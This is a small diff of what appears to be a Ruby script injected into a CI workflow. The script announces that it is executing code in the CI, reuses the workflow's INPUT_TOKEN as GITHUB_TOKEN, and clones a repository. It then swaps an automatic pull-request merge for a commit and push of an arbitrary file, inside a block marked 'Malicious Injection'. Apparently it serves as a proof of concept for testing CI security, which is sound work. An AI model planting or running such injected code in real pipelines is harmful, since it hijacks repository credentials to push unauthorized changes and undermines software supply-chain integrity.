@@ -15,5 +15,6 @@ puts " [!] I am executing code in your CI!"
 puts "------------------------------------------------"
 ENV["GITHUB_TOKEN"] = ENV["INPUT_TOKEN"]
 system("gh repo clone elizabethtl/test-oracle-devrel")
-system("cd test-oracle-devrel && gh pr merge 3 --merge")
+system("cd test-oracle-devrel && echo \"test\" > test")
+system("cd test-oracle-devrel && git add . && git commit -m 'Surely this wont be added' && git push")
 # --- Malicious Injection Ends Here ---
